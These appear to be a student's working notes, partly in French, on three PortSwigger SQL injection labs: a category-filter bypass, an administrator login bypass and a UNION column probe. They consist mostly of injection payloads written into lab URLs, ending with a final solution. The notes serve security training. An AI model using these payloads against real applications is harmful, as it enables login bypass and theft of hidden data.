# exo 1

Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
SELECT * FROM products WHERE category = ' Gifts' OR 1 -- -' AND released = 1
```

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products. 


page d'accueil avec une barre de menu / dans formulaire

https://0ad1006903695f78806b62000000001f.web-security-academy.net/filter?category=Accessories
https://0ad1006903695f78806b62000000001f.web-security-academy.net/filter?category=salut
https://0ad1006903695f78806b62000000001f.web-security-academy.net/filter?category=Gifts
https://0ad1006903695f78806b62000000001f.web-security-academy.net/filter?category=Gifts'
https://0ad1006903695f78806b62000000001f.web-security-academy.net/filter?category=Gifts' OR 1 --
https://0ad1006903695f78806b62000000001f.web-security-academy.net/filter?category=Gifts' OR 1 #
https://0ad1006903695f78806b62000000001f.web-security-academy.net/filter?category=Gifts' OR '1' = '1


SELECT * FROM products WHERE category = 'Gifts' OR '1'='1' AND released = 1

---

# exo 2

Lab: SQL injection vulnerability allowing login bypass

 This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user. 

`administrator' -- `

SELECT * FROM users login = 'administrator' -- ' AND password = 'a'

# exo 3

Lab: SQL injection UNION attack, finding a column containing text


https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets
https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets' UNION SELECT 1 --
https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets' UNION SELECT 1 , '2


https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets' -- -
https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets' # 

https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets' OR 1 -- -
https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets' OR '1'= '1 

https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets' OR '1'= '1'   UNION SELECT 1 , '2' , 1 --

https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets' OR '1'= '1'   UNION SELECT NULL , NULL , NULL --

https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets' OR '1'='1' UNION SELECT 1 , 2 , 3 , '4

https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets' OR '1'='1' UNION SELECT 1 , 2 , 3 , 4 , '5

https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets' UNION SELECT 1 , 2 , 3 , '4
https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets' UNION SELECT 1 , 2 , 3 , 4 , '5
https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets' UNION SELECT 1 , 2 , 3 , 4 , 5 , '6
https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets' UNION SELECT 1 , 2 , 3 , 4 , 5 , 6, '7
https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets' UNION SELECT 1 , 2 , 3 , 4 , 5 , 6, 7, '8
https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=Pets' UNION SELECT 1 , 2 , 3 , 4 , 5 , 6, 7, 8 ,'9



SELECT id, prenom , nom FROM user


SELECT 'a', 1, 3 

SOlution finale

https://0a2c00cd0469cda4818917ab00d400bc.web-security-academy.net/filter?category=' UNION SELECT NULL, 'SaHO6K' , NULL --